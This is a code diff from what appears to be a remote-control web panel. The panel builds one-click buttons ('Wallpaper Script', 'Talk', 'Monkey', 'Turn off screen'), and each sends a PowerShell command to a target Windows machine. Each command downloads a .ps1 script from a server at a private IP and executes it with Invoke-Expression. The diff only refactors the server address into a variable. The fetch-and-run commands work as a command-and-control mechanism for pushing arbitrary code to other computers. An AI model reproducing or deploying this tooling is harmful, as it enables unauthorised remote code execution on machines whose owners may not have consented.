@@ -55,22 +55,23 @@
 
     // Function to dynamically create prebuilt script buttons
     function createPrebuiltScriptButtons() {
+        const serverURL = "http://192.168.80.24:5000"
         const scripts = [
             {
                 name: 'Test Script',
-                command: 'Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://192.168.30.20:5000/static/scripts/script.ps1").Content) )'
+                command: `Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "${serverURL}/static/scripts/script.ps1").Content) )`
             },
             {
                 name: 'Wallpaper Script',
-                command: 'Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://192.168.30.20:5000/static/scripts/wallpaper.ps1").Content) )'
+                command: `Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "${serverURL}/static/scripts/wallpaper.ps1").Content) )`
             },
             {
                 name: 'Talk',
-                command: 'Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://192.168.30.20:5000/static/scripts/talk.ps1").Content) )'
+                command: `Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "${serverURL}/static/scripts/talk.ps1").Content) )`
             },
             {
                 name: 'Monkey',
-                command: 'Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "http://192.168.30.20:5000/static/scripts/monkey.ps1").Content) )'
+                command: `Invoke-Expression ( [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri "${serverURL}/static/scripts/monkey.ps1").Content) )`
             },
             {
                 name: 'Turn off screen',
